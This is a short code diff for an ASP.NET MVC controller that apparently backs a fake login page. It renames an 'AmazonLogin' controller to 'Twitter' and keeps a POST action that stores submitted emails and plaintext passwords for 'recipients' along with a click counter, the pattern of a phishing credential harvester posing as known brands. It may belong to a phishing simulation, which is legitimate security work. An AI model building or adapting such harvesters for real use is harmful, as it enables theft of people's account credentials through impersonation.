@@ -7,21 +7,21 @@ using WebApplicationMVC2.Models;
 
 namespace WebApplicationMVC2.Controllers
 {
-    public class AmazonLoginController : Controller
+    public class TwitterController : Controller
     {
         private readonly RecipientModel _context;
 
-        public AmazonLoginController()
+        public TwitterController()
         {
             _context = new RecipientModel();
         }
-        public ActionResult AmazonLogin()
+        public ActionResult Twitter()
         {
             return View();
         }
 
         [HttpPost]
-        public ActionResult AmazonLogin(string email, string password)
+        public ActionResult Twitter(string email, string password)
         {
             var existingUser = _context.Recipient.SingleOrDefault(u => u.Email == email);
 
@@ -41,7 +41,7 @@ namespace WebApplicationMVC2.Controllers
                 Password = password,
                 TotalClicks = 1
             };
-            
+
 
             recipient.EnterDate = DateTime.Now;
             _context.Recipient.Add(recipient);
